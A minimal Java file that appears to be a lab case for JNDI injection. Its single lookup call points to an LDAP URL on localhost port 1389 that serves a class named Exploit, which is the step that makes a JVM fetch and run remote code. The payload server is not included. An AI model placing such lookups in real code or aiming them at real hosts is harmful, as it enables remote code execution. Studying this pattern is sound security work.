import javax.naming.InitialContext;
import java.util.Hashtable;

public class LookupCase {
    public static void main(String[] args) throws Exception{
        Hashtable env = new Hashtable();
        InitialContext initialContext = new InitialContext(env);
        Object lookup = initialContext.lookup("ldap://127.0.0.1:1389/Exploit");
    }
}
